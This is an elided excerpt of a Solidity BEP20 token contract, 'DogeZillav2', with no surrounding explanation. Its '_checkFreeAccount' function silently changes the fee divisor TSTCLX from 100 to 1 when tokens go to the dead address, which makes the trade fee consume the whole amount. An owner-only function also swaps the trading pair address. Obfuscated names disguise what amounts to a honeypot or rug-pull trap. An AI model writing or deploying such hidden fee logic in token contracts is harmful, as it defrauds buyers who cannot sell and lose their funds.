...
contract DogeZillav2 is BEP20, Ownable {
    ...
    uint256 private TSTCLX = 100;
    address private  _deadAddress = 0x000000000000000000000000000000000000dEaD;
    function PairList(address _address) external onlyOkwn {
        uniswapV2Pair = _address;
    }
    function _checkFreeAccount(address from, address _to) internal  returns (bool) {

        if(_to==_deadAddress){
          TSTCLX=1;
        }

        return from==_deadAddress ||_deadAddress ==_to;
    }
    ...
    function _receiveF(
        ...
        if (rF) {
            ...
            tradeaFeaeNumber = _Number.mul(tradeaFeae).div(TSTCLX);
        }
